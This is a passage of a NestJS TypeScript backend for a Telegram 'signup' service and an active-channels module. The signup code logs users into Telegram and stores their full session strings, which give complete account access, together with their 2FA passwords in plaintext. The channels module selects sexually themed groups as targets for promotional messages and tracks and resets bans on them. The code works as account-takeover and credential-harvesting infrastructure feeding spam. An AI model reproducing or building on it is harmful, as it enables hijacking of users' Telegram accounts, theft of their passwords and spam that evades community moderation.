'../../utils';\n\n@Controller('tgsignup')\n@ApiTags('tgsignup')\n@ApiExtraModels(SendCodeDto, VerifyCodeDto, TgSignupResponse)\nexport class TgSignupController {\n    private readonly logger = new Logger(TgSignupController.name);\n\n    constructor(private readonly tgSignupService: TgSignupService) {}\n\n    @Post('send-code')\n    @ApiOperation({\n        summary: 'Send verification code to phone number',\n        description: 'Initiates the signup process by sending a verification code via Telegram'\n    })\n    @ApiResponse({\n        status: HttpStatus.CREATED,\n        type: TgSignupResponse,\n        description: 'Code sent successfully'\n    })\n    @ApiResponse({\n        status: HttpStatus.BAD_REQUEST,\n        description: 'Invalid phone number or failed to send code',\n        schema: {\n            type: 'object',\n            properties: {\n                statusCode: { type: 'number', example: 400 },\n                message: { type: 'string', example: 'Invalid phone number format' },\n                error: { type: 'string', example: 'Bad Request' }\n            }\n        }\n    })\n    @ApiResponse({\n        status: HttpStatus.TOO_MANY_REQUESTS,\n        description: 'Rate limit exceeded'\n    })\n    @ApiResponse({\n        status: HttpStatus.INTERNAL_SERVER_ERROR,\n        description: 'Internal server error occurred'\n    })\n    async sendCode(@Body() sendCodeDto: SendCodeDto): Promise<TgSignupResponse> {\n        try {\n            this.logger.debug(`[SEND_CODE] Request received for phone: ${sendCodeDto.phone}`);\n            const result = await this.tgSignupService.sendCode(sendCodeDto.phone);\n\n            return {\n                status: HttpStatus.CREATED,\n                message: 'Code sent to your Telegram App',\n                phoneCodeHash: result.phoneCodeHash,\n                isCodeViaApp: result.isCodeViaApp\n            };\n        } catch (error) {\n            this.logger.error(`[SEND_CODE] Error for phone: ${sendCodeDto.phone}`, {\n                error,\n                stack: error.stack\n            });\n\n            throw error;\n        }\n    }\n\n    @Post('verify')\n    @ApiOperation({\n        summary: 'Verify code and complete signup/login',\n        description: 'Verifies the code sent to phone and completes the signup/login process'\n    })\n    @ApiResponse({\n        status: HttpStatus.OK,\n        type: TgSignupResponse,\n        description: 'Verification successful'\n    })\n    @ApiResponse({\n        status: HttpStatus.BAD_REQUEST,\n        description: 'Invalid code or verification failed'\n    })\n    @ApiResponse({\n        status: HttpStatus.TOO_MANY_REQUESTS,\n        description: 'Rate limit exceeded'\n    })\n    @ApiResponse({\n        status: HttpStatus.INTERNAL_SERVER_ERROR,\n        description: 'Internal server error occurred'\n    })\n    async verifyCode(@Body() verifyCodeDto: VerifyCodeDto): Promise<TgSignupResponse> {\n        try {\n            this.logger.debug(`[VERIFY_CODE] Request received for phone: ${verifyCodeDto.phone}`);\n\n            const result = await this.tgSignupService.verifyCode(\n                verifyCodeDto.phone,\n                verifyCodeDto.code,\n                verifyCodeDto.password\n            );\n\n            return {\n                status: result.requires2FA ? HttpStatus.BAD_REQUEST : HttpStatus.OK,\n                message: result.message || 'Successfully logged in',\n                session: result.session,\n                requires2FA: result.requires2FA\n            };\n        } catch (error) {\n            this.logger.error(`[VERIFY_CODE] Error for phone: ${verifyCodeDto.phone}`, {\n                error,\n                stack: error.stack\n            });\n\n            throw error;\n        }\n    }\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { TgSignupController } from './tg-signup.controller';\nimport { UsersModule } from '../users/users.module';\nimport { TgSignupService } from './tg-signup.service';\nimport { InitModule } from '../ConfigurationInit';\n\n@Module({\n    imports: [\n        InitModule,\n        forwardRef(() => UsersModule)],\n    controllers: [TgSignupController],\n    providers: [TgSignupService],\n    exports: [TgSignupService]\n})\nexport class TgSignupModule { }\n","import { Injectable, BadRequestException, InternalServerErrorException, OnModuleDestroy } from \"@nestjs/common\";\nimport { Api } from \"telegram/tl\";\nimport { TelegramClient } from \"telegram\";\nimport { StringSession } from \"telegram/sessions\";\nimport { LogLevel } from \"telegram/extensions/Logger\";\nimport { computeCheck } from \"telegram/Password\";\nimport { UsersService } from \"../users/users.service\";\nimport { TgSignupResponse } from \"./dto/tg-signup.dto\";\nimport { CreateUserDto } from \"../users/dto/create-user.dto\";\nimport { parseError } from \"../../utils/parseError\";\nimport { getCredentialsForMobile } from \"../../utils/tg-apps\";\nimport { Logger } from \"../../utils\";\n\n@Injectable()\nexport class TgSignupService implements OnModuleDestroy {\n    private readonly logger = new Logger(TgSignupService.name);\n    private static readonly LOGIN_TIMEOUT = 300000; // 10 minutes instead of 2.5\n    private static readonly SESSION_CLEANUP_INTERVAL = 300000; // 5 minutes instead of 2\n    private static readonly PHONE_PREFIX = \"+\"; // Prefix for phone numbers\n    private readonly cleanupInterval: NodeJS.Timeout;\n\n    // Map to store active client sessions\n    private static readonly activeClients = new Map<string, {\n        client: TelegramClient;\n        phoneCodeHash: string;\n        timeoutId: NodeJS.Timeout;\n        createdAt: number;\n    }>();\n\n    // API credentials pool for load balancing with correct hashes\n\n\n    constructor(private readonly usersService: UsersService) {\n        this.cleanupInterval = setInterval(() => this.cleanupStaleSessions(), TgSignupService.SESSION_CLEANUP_INTERVAL);\n    }\n\n    async onModuleDestroy() {\n        clearInterval(this.cleanupInterval);\n        // Cleanup all active sessions\n        const phones = Array.from(TgSignupService.activeClients.keys());\n        await Promise.all(phones.map(phone => this.disconnectClient(phone)));\n    }\n\n    private async cleanupStaleSessions() {\n        for (const [phone, session] of TgSignupService.activeClients) {\n            try {\n                // Only cleanup if session is truly stale (disconnected and timeout exceeded)\n                if (Date.now() - session.createdAt > TgSignupService.LOGIN_TIMEOUT &&\n                    (!session.client || !session.client.connected)) {\n                    await this.disconnectClient(phone);\n                }\n            } catch (error) {\n                this.logger.warn(`Error cleaning up session for ${phone}: ${error.message}`);\n            }\n        }\n    }\n\n    private validatePhoneNumber(phone: string): string {\n        // Remove any existing + prefix\n        phone = phone.replace(/^\\+/, '');\n\n        // Validate phone number format\n        if (!/^\\d{8,15}$/.test(phone)) {\n            throw new BadRequestException('Please enter a valid phone number');\n        }\n\n        return phone;\n    }\n\n    private async disconnectClient(phone: string): Promise<void> {\n        const session = TgSignupService.activeClients.get(phone);\n        if (session) {\n            try {\n                clearTimeout(session.timeoutId);\n                await session.client.destroy();\n                this.logger.log(`Client disconnected for ${phone}`);\n            } catch (error) {\n                this.logger.warn(`Error disconnecting client for ${phone}: ${error.message}`);\n            } finally {\n                TgSignupService.activeClients.delete(phone);\n            }\n        }\n    }\n\n    async sendCode(phone: string): Promise<Pick<TgSignupResponse, 'phoneCodeHash' | 'isCodeViaApp'>> {\n        try {\n            phone = this.validatePhoneNumber(phone);\n\n            // Check if there's an existing active session that can be reused\n            const existingSession = TgSignupService.activeClients.get(phone);\n            if (existingSession && existingSession.client?.connected) {\n                // If session exists and is still valid, disconnect it before creating new one\n                await this.disconnectClient(phone);\n            }\n\n            const { apiId, apiHash } = await getCredentialsForMobile(phone, 600);\n            const session = new StringSession('');\n            const client = new TelegramClient(session, apiId, apiHash, {\n                connectionRetries: 5,\n                retryDelay: 2000,\n                useWSS: false,\n                useIPV6: false,\n                timeout: 30000\n            });\n\n            await client.setLogLevel(LogLevel.ERROR);\n\n            await client.connect();\n\n            const sendResult = await client.invoke(\n                new Api.auth.SendCode({\n                    phoneNumber: phone,\n                    apiId,\n                    apiHash,\n                    settings: new Api.CodeSettings({\n                        currentNumber: true,\n                        allowAppHash: true,\n                    }),\n                })\n            );\n\n            if (sendResult instanceof Api.auth.SentCodeSuccess) {\n                this.logger.error(`Unexpected immediate login for ${phone}`);\n                throw new BadRequestException('Unexpected immediate login');\n            }\n            const timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService.LOGIN_TIMEOUT);\n\n            TgSignupService.activeClients.set(phone, {\n                client,\n                phoneCodeHash: sendResult.phoneCodeHash,\n                timeoutId,\n                createdAt: Date.now()\n            });\n\n            return {\n                phoneCodeHash: sendResult.phoneCodeHash,\n                isCodeViaApp: sendResult.type instanceof Api.auth.SentCodeTypeApp,\n            };\n        } catch (error) {\n            this.logger.error(`Failed to send code to ${phone}: ${error.message}`, error.stack);\n            await this.disconnectClient(phone);\n\n            if (error.errorMessage?.includes('PHONE_NUMBER_BANNED')) {\n                throw new BadRequestException('This phone number has been banned from Telegram');\n            }\n            if (error.errorMessage?.includes('PHONE_NUMBER_INVALID')) {\n                throw new BadRequestException('Please enter a valid phone number');\n            }\n            if (error.errorMessage?.includes('FLOOD_WAIT')) {\n                throw new BadRequestException('Please wait a few minutes before trying again');\n            }\n\n            throw new BadRequestException('Unable to send OTP. Please try again');\n        }\n    }\n\n    async verifyCode(phone: string, code: string, password?: string): Promise<TgSignupResponse> {\n        try {\n            phone = this.validatePhoneNumber(phone);\n\n            const session = TgSignupService.activeClients.get(phone);\n            if (!session) {\n                this.logger.warn(`No active signup session found for ${phone}`);\n                throw new BadRequestException('Session Expired. Please start again');\n            }\n\n            // Always extend session timeout on verification attempt, regardless of success\n            clearTimeout(session.timeoutId);\n            session.timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService.LOGIN_TIMEOUT);\n\n            if (!session.client?.connected) {\n                try {\n                    await session.client?.connect();\n                } catch (error) {\n                    // Don't disconnect, just try to reconnect\n                    this.logger.warn(`Connection lost for ${phone}, attempting to reconnect`);\n                    try {\n                        const { apiId, apiHash } = await getCredentialsForMobile(phone, 600);\n                        const newSession = new StringSession('');\n                        const newClient = new TelegramClient(newSession, apiId, apiHash, {\n                            connectionRetries: 5,\n                            retryDelay: 2000,\n                            useWSS: false,\n                            timeout: 30000\n                        });\n                        await newClient.connect();\n                        session.client = newClient;\n                    } catch (reconnectError) {\n                        throw new BadRequestException('Connection failed. Please try verifying again.');\n                    }\n                }\n            }\n\n            const { client, phoneCodeHash } = session;\n\n            try {\n                this.logger.debug(`Attempting to sign in with code for ${phone}`);\n                const signInResult = await client.invoke(\n                    new Api.auth.SignIn({\n                        phoneNumber: phone,\n                        phoneCodeHash,\n                        phoneCode: code,\n                    })\n                ) as Api.auth.Authorization;\n\n                if (!signInResult) {\n                    throw new BadRequestException('Invalid response from Telegram server');\n                }\n\n                if (signInResult instanceof Api.auth.AuthorizationSignUpRequired) {\n                    this.logger.log(`New user registration required for ${phone}`);\n                    const result = await this.handleNewUserRegistration(phone, client, phoneCodeHash);\n                    await this.disconnectClient(phone);\n                    return result;\n                }\n\n                // Store the session string before processing\n                const sessionString = client.session.save() as unknown as string;\n                if (!sessionString) {\n                    throw new Error('Failed to generate session string');\n                }\n\n                const userData = await this.processLoginResult(signInResult.user, sessionString, password);\n                await this.disconnectClient(phone);\n                return userData;\n            } catch (error) {\n                if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {\n                    this.logger.warn(`2FA required for ${phone}`);\n                    if (!password) {\n                        return {\n                            status: 400,\n                            message: 'Two-factor authentication required',\n                            requires2FA: true\n                        };\n                    }\n                    return await this.handle2FALogin(phone, session.client, password);\n                }\n                if (error.errorMessage?.includes('PHONE_CODE_INVALID') ||\n                    error.errorMessage?.includes('PHONE_CODE_EXPIRED')) {\n                    throw new BadRequestException('Invalid OTP,  Try again!');\n                }\n\n                this.logger.warn(`Verification attempt failed for ${phone}: ${error.message}`);\n                throw new BadRequestException('Verification failed. Please try again.');\n            }\n        } catch (error) {\n            this.logger.error(`Verification error for ${phone}: ${error.message}`);\n\n            if (error.message?.includes('No active signup session') ||\n                error.message?.includes('Connection failed')) {\n                await this.disconnectClient(phone);\n            }\n\n            throw error instanceof BadRequestException ? error :\n                new BadRequestException(error.message || 'Verification failed, please try again');\n        }\n    }\n\n    private async handle2FALogin(phone: string, client: TelegramClient, password: string): Promise<TgSignupResponse> {\n        try {\n            this.logger.debug(`Fetching password SRP parameters for ${phone}`);\n            const passwordSrpResult = await client.invoke(new Api.account.GetPassword());\n\n            this.logger.debug(`Computing password check for ${phone}`);\n            const passwordCheck = await computeCheck(passwordSrpResult, password);\n\n            this.logger.debug(`Invoking CheckPassword API for ${phone}`);\n            const signInResult = await client.invoke(\n                new Api.auth.CheckPassword({\n                    password: passwordCheck,\n                })\n            ) as Api.auth.Authorization;\n\n            if (!signInResult || !signInResult.user) {\n                throw new BadRequestException('Invalid response from Telegram server');\n            }\n\n            this.logger.log(`2FA login successful for ${phone}`);\n            const sessionString = client.session.save() as unknown as string;\n            if (!sessionString) {\n                throw new Error('Failed to generate session string');\n            }\n\n            const userData = await this.processLoginResult(signInResult.user, sessionString, password);\n            await this.disconnectClient(phone);\n            return userData;\n        } catch (error) {\n            this.logger.error(`2FA login failed for ${phone}: ${error.message}`, error.stack);\n            if (password) {\n                throw new BadRequestException('Incorrect 2FA password');\n            }\n            throw new BadRequestException('2FA password required');\n        }\n    }\n\n    private async handleNewUserRegistration(\n        phone: string,\n        client: TelegramClient,\n        phoneCodeHash: string\n    ): Promise<TgSignupResponse> {\n        try {\n            const randomName = `User${Math.random().toString(36).substring(2, 8)}`;\n            const signUpResult = await client.invoke(\n                new Api.auth.SignUp({\n                    phoneNumber: phone,\n                    phoneCodeHash,\n                    firstName: randomName,\n                    lastName: '', // Keep empty for privacy\n                })\n            ) as Api.auth.Authorization;\n\n            if (!signUpResult || !signUpResult.user) {\n                throw new BadRequestException('Invalid response from Telegram server');\n            }\n\n            const sessionString = client.session.save() as unknown as string;\n            if (!sessionString) {\n                throw new Error('Failed to generate session string');\n            }\n\n            return await this.processLoginResult(signUpResult.user, sessionString);\n        } catch (error) {\n            const errorDetails = parseError(error, \"TGSIGNUP\", false);\n            this.logger.error(`Failed to register new user: ${errorDetails.message}`);\n            throw new BadRequestException(errorDetails.message || 'Failed to register new user');\n        }\n    }\n\n    private async processLoginResult(user: any, sessionString: string, password?: string): Promise<TgSignupResponse> {\n        try {\n            if (!user || !sessionString) {\n                throw new Error('Invalid user data or session string');\n            }\n\n            // Add additional user metadata\n            const now = new Date();\n            const userData: CreateUserDto = {\n                mobile: user.phone?.toString()?.replace(/^\\+/, '') || '',\n                session: sessionString,\n                firstName: user.firstName || '',\n                lastName: user.lastName || '',\n                username: user.username || '',\n                tgId: user.id?.toString() || '',\n                twoFA: !!password,\n                password: password || null,\n                lastActive: now.toISOString().split('T')[0],\n                expired: false,\n                channels: 0,\n                personalChats: 0,\n                totalChats: 0,\n                otherPhotoCount: 0,\n                ownPhotoCount: 0,\n                ownVideoCount: 0,\n                otherVideoCount: 0,\n                recentUsers: [],\n                calls: {\n                    totalCalls: 0,\n                    outgoing: 0,\n                    incoming: 0,\n                    video: 0,\n                    audio: 0,\n                    chats: [],\n                },\n                contacts: 0,\n                movieCount: 0,\n                msgs: 0,\n                photoCount: 0,\n                videoCount: 0,\n                gender: 'unknown',\n            };\n\n            // Validate required fields\n            if (!userData.mobile || !userData.tgId) {\n                throw new Error('Invalid user data received from Telegram');\n            }\n\n            await this.usersService.create(userData);\n            return {\n                status: 200,\n                message: 'Registration successful',\n                session: sessionString,\n            };\n        } catch (error) {\n            this.logger.error('Error processing login result:', error);\n            if (error instanceof BadRequestException) {\n                throw error;\n            }\n            throw new InternalServerErrorException('Failed to complete registration');\n        }\n    }\n}\n","import { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\nimport { ActiveChannelsService } from './active-channels.service';\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\nimport { ActiveChannel } from './schemas/active-channel.schema';\n\n@ApiTags('Active Channels')\n@Controller('active-channels')\nexport class ActiveChannelsController {\n  constructor(private readonly activeChannelsService: ActiveChannelsService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new active channel' })\n  async create(@Body() createActiveChannelDto: CreateActiveChannelDto) {\n    return this.activeChannelsService.create(createActiveChannelDto);\n  }\n\n  @Post('createMultiple')\n  @ApiOperation({ summary: 'Create multiple channels' })\n  @ApiBody({ type: [CreateActiveChannelDto] })\n  async createMultiple(@Body() createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\n    return this.activeChannelsService.createMultiple(createChannelDtos);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search channels by filters' })\n  @ApiQuery({ name: 'channelId', required: false, type: String })\n  @ApiQuery({ name: 'broadcast', required: false, type: Boolean })\n  @ApiQuery({ name: 'canSendMsgs', required: false, type: Boolean })\n  @ApiQuery({ name: 'participantsCount', required: false, type: Number })\n  @ApiQuery({ name: 'restricted', required: false, type: Boolean })\n  @ApiQuery({ name: 'sendMessages', required: false, type: Boolean })\n  @ApiQuery({ name: 'title', required: false, type: String })\n  @ApiQuery({ name: 'username', required: false, type: String })\n  @ApiQuery({ name: 'wordRestriction', required: false, type: Number })\n  @ApiQuery({ name: 'dMRestriction', required: false, type: Number })\n  @ApiQuery({ name: 'availableMsgs', required: false, type: [String] })\n  @ApiQuery({ name: 'banned', required: false, type: Boolean })\n  @ApiQuery({ name: 'reactRestricted', required: false, type: Boolean })\n  @ApiQuery({ name: 'megagroup', required: false, type: Boolean })\n  search(@Query() query: any): Promise<ActiveChannel[]> {\n    return this.activeChannelsService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all active channels' })\n  async findAll() {\n    return this.activeChannelsService.findAll();\n  }\n\n  @Get(':channelId')\n  @ApiOperation({ summary: 'Get an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'Return the active channel', type: ActiveChannel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async findOne(@Param('channelId') channelId: string) {\n    return this.activeChannelsService.findOne(channelId);\n  }\n\n  @Patch(':channelId')\n  @ApiOperation({ summary: 'Update an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: ActiveChannel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async update(@Param('channelId') channelId: string, @Body() updateActiveChannelDto: UpdateActiveChannelDto) {\n    return this.activeChannelsService.update(channelId, updateActiveChannelDto);\n  }\n\n  @Delete(':channelId')\n  @ApiOperation({ summary: 'Delete an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async remove(@Param('channelId') channelId: string) {\n    return this.activeChannelsService.remove(channelId);\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ActiveChannelsService } from './active-channels.service';\nimport { ActiveChannelsController } from './active-channels.controller';\nimport { ActiveChannel, ActiveChannelSchema } from './schemas/active-channel.schema';\nimport { InitModule } from '../ConfigurationInit/init.module';\nimport { PromoteMsgModule } from '../promote-msgs/promote-msgs.module';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ name: ActiveChannel.name, schema: ActiveChannelSchema }]),\n    PromoteMsgModule\n  ],\n  controllers: [ActiveChannelsController],\n  providers: [ActiveChannelsService],\n  exports: [ActiveChannelsService]\n})\nexport class ActiveChannelsModule { }\n","import { PromoteMsgsService } from './../promote-msgs/promote-msgs.service';\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model, PipelineStage } from 'mongoose';\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\nimport { ActiveChannel, ActiveChannelDocument } from './schemas/active-channel.schema';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { getBotsServiceInstance } from '../../utils';\nimport { ChannelCategory } from '../bots';\n\n@Injectable()\nexport class ActiveChannelsService {\n  private readonly DEFAULT_LIMIT = 50;\n  private readonly DEFAULT_SKIP = 0;\n  private readonly MIN_PARTICIPANTS_COUNT = 600;\n\n  constructor(\n    @InjectModel(ActiveChannel.name) private activeChannelModel: Model<ActiveChannelDocument>,\n    @Inject(forwardRef(() => PromoteMsgsService))\n    private promoteMsgsService: PromoteMsgsService,\n  ) { }\n\n  async create(createActiveChannelDto: CreateActiveChannelDto): Promise<ActiveChannel> {\n    try {\n      if (!createActiveChannelDto.channelId) {\n        throw new BadRequestException('Channel ID is required');\n      }\n\n      const availableMsgs = await this.getAvailableMessages();\n      const createdChannel = new this.activeChannelModel({\n        ...createActiveChannelDto,\n        availableMsgs,\n        createdAt: new Date(),\n      });\n\n      return await createdChannel.save();\n    } catch (error) {\n      throw this.handleError(error, 'Failed to create channel');\n    }\n  }\n\n  async createMultiple(createChannelDtos: Partial<CreateActiveChannelDto>[]): Promise<string> {\n    try {\n      if (!createChannelDtos?.length) {\n        throw new BadRequestException('At least one channel DTO is required');\n      }\n\n      const bulkOps = createChannelDtos.map((dto) => {\n        if (!dto.channelId) {\n          throw new BadRequestException('Channel ID is required for all DTOs');\n        }\n\n        const setFields: Record<string, unknown> = { updatedAt: new Date() };\n        if (dto.title != null) setFields.title = dto.title;\n        if (dto.username != null) setFields.username = dto.username;\n        if (dto.participantsCount != null) setFields.participantsCount = dto.participantsCount;\n\n        return {\n          updateOne: {\n            filter: { channelId: dto.channelId },\n            update: {\n              $set: setFields,\n              $setOnInsert: {\n                channelId: dto.channelId,\n                broadcast: false,\n                canSendMsgs: true,\n                participantsCount: dto.participantsCount ?? 0,\n                restricted: false,\n                sendMessages: true,\n                reactRestricted: false,\n                wordRestriction: 0,\n                dMRestriction: 0,\n                availableMsgs: [],\n                banned: false,\n                megagroup: dto.megagroup ?? true,\n                private: false,\n                createdAt: new Date(),\n              },\n            },\n            upsert: true,\n          },\n        };\n      });\n\n      await this.activeChannelModel.bulkWrite(bulkOps, { ordered: false });\n      return `Successfully processed ${createChannelDtos.length} channels`;\n    } catch (error) {\n      throw this.handleError(error, 'Failed to create multiple channels');\n    }\n  }\n\n  async findAll(): Promise<ActiveChannel[]> {\n    try {\n      return await this.activeChannelModel.find().lean().exec();\n    } catch (error) {\n      throw this.handleError(error, 'Failed to fetch all channels');\n    }\n  }\n\n  async findOne(channelId: string): Promise<ActiveChannel | null> {\n    try {\n      if (!channelId) {\n        throw new BadRequestException('Channel ID is required');\n      }\n      return await this.activeChannelModel.findOne({ channelId }).lean().exec();\n    } catch (error) {\n      throw this.handleError(error, 'Failed to fetch channel');\n    }\n  }\n\n  async update(channelId: string, updateActiveChannelDto: UpdateActiveChannelDto): Promise<ActiveChannel> {\n    try {\n      delete updateActiveChannelDto[\"_id\"]\n      if (!channelId) {\n        throw new BadRequestException('Channel ID is required');\n      }\n\n      const cleanDto = Object.fromEntries(\n        Object.entries(updateActiveChannelDto).filter(([_, value]) => value !== undefined)\n      );\n\n      if (Object.keys(cleanDto).length === 0) {\n        throw new BadRequestException('At least one field to update is required');\n      }\n\n      const updatedChannel = await this.activeChannelModel\n        .findOneAndUpdate(\n          { channelId },\n          { $set: { ...cleanDto, updatedAt: new Date() } },\n          { new: true, upsert: true, lean: true }\n        )\n        .exec();\n\n      return updatedChannel;\n    } catch (error) {\n      throw this.handleError(error, 'Failed to update channel');\n    }\n  }\n\n  async removeFromAvailableMsgs(channelId: string, msg: string): Promise<ActiveChannel | null> {\n    try {\n      if (!channelId || !msg) {\n        throw new BadRequestException('Channel ID and message are required');\n      }\n\n      return await this.activeChannelModel\n        .findOneAndUpdate(\n          { channelId },\n          { $pull: { availableMsgs: msg }, $set: { updatedAt: new Date() } },\n          { new: true, lean: true }\n        )\n        .exec();\n    } catch (error) {\n      throw this.handleError(error, 'Failed to remove message from available messages');\n    }\n  }\n\n  async addToAvailableMsgs(channelId: string, msg: string): Promise<ActiveChannel | null> {\n    try {\n      if (!channelId || !msg) {\n        throw new BadRequestException('Channel ID and message are required');\n      }\n\n      return await this.activeChannelModel\n        .findOneAndUpdate(\n          { channelId },\n          { $addToSet: { availableMsgs: msg }, $set: { updatedAt: new Date() } },\n          { new: true, lean: true }\n        )\n        .exec();\n    } catch (error) {\n      throw this.handleError(error, 'Failed to add message to available messages');\n    }\n  }\n\n  async remove(channelId: string): Promise<void> {\n    try {\n      if (!channelId) {\n        throw new BadRequestException('Channel ID is required');\n      }\n\n      const botsService = getBotsServiceInstance();\n      if (botsService) {\n        await botsService.sendMessageByCategory(\n          ChannelCategory.PROM_LOGS2,\n          `Removing Active Channel: ${channelId}`\n        );\n      }\n\n      await this.activeChannelModel.findOneAndDelete({ channelId }).exec();\n    } catch (error) {\n      throw this.handleError(error, 'Failed to remove channel');\n    }\n  }\n\n  async search(filter: any): Promise<ActiveChannel[]> {\n    try {\n      if (!filter || Object.keys(filter).length === 0) {\n        throw new BadRequestException('Search filter is required');\n      }\n\n      return await this.activeChannelModel.find(filter).lean().exec();\n    } catch (error) {\n      throw this.handleError(error, 'Failed to search channels');\n    }\n  }\n\n  async getActiveChannels(limit = this.DEFAULT_LIMIT, skip = this.DEFAULT_SKIP, notIds: string[] = []): Promise<ActiveChannel[]> {\n    try {\n      const positiveKeywords = [\n        'wife', 'adult', 'lanj', 'lesb', 'paid', 'coupl', 'cpl', 'randi', 'bhab', 'boy', 'girl',\n        'friend', 'frnd', 'boob', 'pussy', 'dating', 'swap', 'gay', 'sex', 'bitch', 'love', 'video',\n        'service', 'real', 'call', 'desi', 'partner', 'hook', 'romance', 'flirt', 'single', 'chat',\n        'meet', 'intimate', 'escort', 'night', 'fun', 'hot', 'sexy', 'lovers', 'connect', 'relationship'\n      ];\n\n      const negativeKeywords = [\n        'online', 'realestat', 'propert', 'freefire', 'bgmi', 'promo', 'agent', 'board', 'design',\n        'realt', 'clas', 'PROFIT', 'wholesale', 'retail', 'topper', 'exam', 'motivat', 'medico',\n        'shop', 'follower', 'insta', 'traini', 'cms', 'cma', 'subject', 'currency', 'color', 'amity',\n        'game', 'gamin', 'like', 'earn', 'popcorn', 'TANISHUV', 'bitcoin', 'crypto', 'mall', 'work',\n        'folio', 'health', 'civil', 'win', 'casino', 'promot', 'english', 'invest', 'fix', 'money',\n        'book', 'anim', 'angime', 'support', 'cinema', 'bet', 'predic', 'study', 'youtube', 'sub',\n        'open', 'trad', 'cric', 'quot', 'exch', 'movie', 'search', 'film', 'offer', 'ott', 'deal',\n        'quiz', 'academ', 'insti', 'talkies', 'screen', 'series', 'webser', 'business', 'market',\n        'trade', 'news', 'tech', 'education', 'learn', 'course', 'job', 'career', 'finance', 'stock',\n        'shopify', 'ecommerce', 'advert', 'marketing', 'blog', 'vlog', 'tutorial', 'fitness', 'gym',\n        'diet', 'travel', 'tour', 'hotel', 'food', 'recipe', 'fashion', 'style', 'beauty', 'music',\n        'art', 'craft', 'event', 'party', 'ticket'\n      ];\n\n      const query = {\n        $and: [\n          {\n            $or: [\n              { title: { $regex: positiveKeywords.join('|'), $options: 'i' } },\n              { username: { $regex: positiveKeywords.join('|'), $options: 'i' } },\n            ],\n          },\n          {\n            $and: [\n              {\n                title: {\n                  $exists: true,\n                  $type: 'string',\n                  $not: { $regex: negativeKeywords.join('|'), $options: 'i' },\n                },\n              },\n              {\n                username: {\n                  $exists: true,\n                  $type: 'string',\n                  $not: { $regex: negativeKeywords.join('|'), $options: 'i' },\n                },\n              },\n            ],\n          },\n          {\n            channelId: { $nin: notIds },\n            participantsCount: { $gt: this.MIN_PARTICIPANTS_COUNT },\n            username: { $ne: null },\n            deletedCount: { $lte: 30 },\n            canSendMsgs: true,\n            restricted: false,\n            banned: false,\n            forbidden: false,\n          },\n        ],\n      };\n\n      const pipeline: PipelineStage[] = [\n        { $match: query },\n        { $addFields: { randomField: { $rand: {} } } },\n        { $sort: { randomField: 1 } },\n        { $skip: skip },\n        { $limit: limit },\n        { $project: { randomField: 0 } },\n      ];\n\n      return await this.activeChannelModel.aggregate<ActiveChannel>(pipeline, { allowDiskUse: true }).exec();\n    } catch (error) {\n      throw this.handleError(error, 'Failed to fetch active channels');\n    }\n  }\n\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<ActiveChannel[]> {\n    try {\n      if (!query || Object.keys(query).length === 0) {\n        throw new BadRequestException('Query is required');\n      }\n\n      const queryExec = this.activeChannelModel.find(query).lean();\n\n      if (sort && Object.keys(sort).length > 0) {\n        queryExec.sort(sort);\n      }\n\n      if (limit && limit > 0) {\n        queryExec.limit(limit);\n      }\n\n      if (skip && skip >= 0) {\n        queryExec.skip(skip);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw this.handleError(error, 'Failed to execute query');\n    }\n  }\n\n  async resetWordRestrictions(): Promise<void> {\n    try {\n      await fetchWithTimeout(`${notifbot()}&text=Request Received for Reset Word Restrictions`);\n      await this.activeChannelModel.updateMany(\n        { banned: false },\n        { $set: { wordRestriction: 0, dMRestriction: 0, updatedAt: new Date() } }\n      );\n    } catch (error) {\n      throw this.handleError(error, 'Failed to reset word restrictions');\n    }\n  }\n\n  async resetAvailableMsgs(): Promise<void> {\n    try {\n      await fetchWithTimeout(`${notifbot()}&text=Request Received for Reset Available Messages`);\n      const availableMsgs = await this.getAvailableMessages();\n\n      await this.activeChannelModel.updateMany(\n        {\n          $expr: {\n            $lt: [{ $size: { $ifNull: ['$availableMsgs', []] } }, 5],\n          },\n        },\n        {\n          $set: {\n            wordRestriction: 0,\n            dMRestriction: 0,\n            banned: false,\n            availableMsgs,\n            updatedAt: new Date(),\n          },\n        }\n      );\n    } catch (error) {\n      throw this.handleError(error, 'Failed to reset available messages');\n    }\n  }\n\n  async updateBannedChannels(): Promise<void> {\n    try {\n      await fetchWithTimeout(`${notifbot()}&text=Request Received for Update Banned Channels`);\n      await this.activeChannelModel.updateMany(\n        { $or: [{ banned: true }, { private: true }] },\n        {\n          $set: {\n            wordRestriction: 0,\n            dMRestriction: 0,\n            banned: false,\n            private: false,\n            updatedAt: new Date(),\n          },\n        }\n      );\n    } catch (error) {\n      throw this.handleError(error, 'Failed to update banned channels');\n    }\n  }\n\n  private async getAvailableMessages(): Promise<string[]> {\n    try {\n      const 